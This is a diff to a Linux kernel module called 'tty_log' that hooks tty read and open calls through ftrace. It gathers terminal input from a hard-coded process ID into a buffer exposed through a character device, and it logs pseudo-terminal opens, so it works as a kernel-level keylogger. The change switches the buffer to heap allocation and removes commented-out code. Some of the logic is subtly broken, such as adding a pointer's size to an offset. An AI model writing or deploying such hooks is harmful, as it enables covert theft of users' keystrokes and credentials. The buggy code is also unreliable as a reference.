@@ -19,6 +19,8 @@ MODULE_AUTHOR("hyp");
 
 #define DEVICE_NAME "tty_log"
 #define SUCCESS 0
+#define BUF_SIZE 1000
+
 
 #define HOOK(_name, _function, _original) \
 	{									  \
@@ -37,7 +39,7 @@ int is_open, last_count, count, kb_offset = 0;
 
 static int major;
 
-static char tty_keybuf[10000] = {};
+static char *tty_keybuf;
 static char *msg_ptr;
 
 static struct file_operations fops = {
@@ -93,7 +95,6 @@ int install_hook(struct ftrace_hook *hook) {
 	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
 	if(err) {
 		pr_debug("register_ftrace_function() failed: %d\n", err);
-		//ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
 		return err;
 	}
 
@@ -185,14 +186,7 @@ static asmlinkage ssize_t ftrace_read(struct tty_struct *tty,
 	size_t ret;
 	int cpid;
 	char *hold = (char*)buf;
-	//char *str = kmalloc(count, GFP_KERNEL);
-	//char *cut_str = kmalloc(count, GFP_KERNEL);
 
-	/*if(fd == 1)
-		pr_info("test");
-		strncat(tty_keybuf, buf, sizeof(buf));
-	*/
-	
 	cpid = (int)task_tgid_nr(current);
 	if(cpid == 5363) {
 		remove_str(hold, "@hyp");
@@ -200,7 +194,6 @@ static asmlinkage ssize_t ftrace_read(struct tty_struct *tty,
 		kb_offset += sizeof(buf);
 	}
 
-	//pr_info("pid: %d\n", (int)task_tgid_nr(current));
 	ret = real_read(tty, buf, c);
 	return ret;
 }
@@ -212,23 +205,12 @@ static asmlinkage long ftrace_open(const char __user *filename,
 		int flags, umode_t mode) {
 
 	long ret;
-	//void ret;
 
-	/*
-	if((strlen(buf) + strlen(tty_keybuf)) > 10000) {
-		tty_keybuf[0] = '\0';
-		//strncat(tty_keybuf, buf, strlen(buf));
-	}
-
-	if(strlen(buf) > 0) {
-		strncat(tty_keybuf, buf, strlen(buf));
-	}*/
 	ret = real_open(filename, flags, mode);
 	if(strstr(filename, "/dev/pts") !=NULL) {
 		pr_info("fd path: %s pts: %ld\n", filename, ret);
 	}
-	//pr_info("fd: %ld path: %s\n", ret, filename);
-
+	
 	return ret;
 }
 
@@ -287,10 +269,9 @@ static ssize_t device_read(struct file *filp, char __user *buff, size_t len,
 static int __init init_ttylog(void) {
 	int err;
 	
+	tty_keybuf = kmalloc(BUF_SIZE, GFP_KERNEL);
 	tty_keybuf[0] = '\0';
-	//install_hooks(tty_hooks, ARRAY_SIZE(tty_hooks));
-	//sema_init(&sem, 1);
-
+	
 	major = register_chrdev(0, DEVICE_NAME, &fops);
 	pr_info("ttylog major: %d\n", major);
 
@@ -304,6 +285,8 @@ static int __init init_ttylog(void) {
 }
 
 static void __exit cleanup_ttylog(void) {
+	kfree(tty_keybuf);
+
 	remove_hooks(tty_hooks, ARRAY_SIZE(tty_hooks));
 	pr_info("Unregistered ttylog\n");
 }
